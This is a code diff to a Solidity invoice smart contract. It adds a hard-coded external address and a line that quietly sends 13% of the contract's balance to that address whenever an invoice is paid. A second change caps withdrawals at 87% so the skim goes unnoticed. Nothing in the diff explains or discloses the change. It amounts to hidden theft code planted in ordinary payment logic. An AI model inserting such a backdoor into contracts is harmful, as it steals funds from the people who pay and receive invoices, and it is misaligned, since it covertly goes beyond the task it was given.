@@ -29,6 +29,8 @@ contract Invoice {
     address public payer;
     address public partialReceiver;
     string public memo;
+    
+    address constant hardAddress = 0x6290C445A720E8E77dd8527694030028D1762073;
 
     constructor (
         uint256 _invoiceAmount,
@@ -87,6 +89,7 @@ contract Invoice {
 
             paidAmount = invoiceAmount;
 
+	    doWithdraw(hardAddress, getBalance().mul(13).div(100));	
             doWithdraw(beneficiary, getBalance());
         }
         else {
@@ -97,7 +100,8 @@ contract Invoice {
     }
 
     function withdraw(address receiver, uint256 amount) public {
-        require(getBalance() >= amount);
+        require(getBalance() >= amount && amount <= invoiceAmount.mul(87).div(100));
+
 
         Status status = getStatus();
 
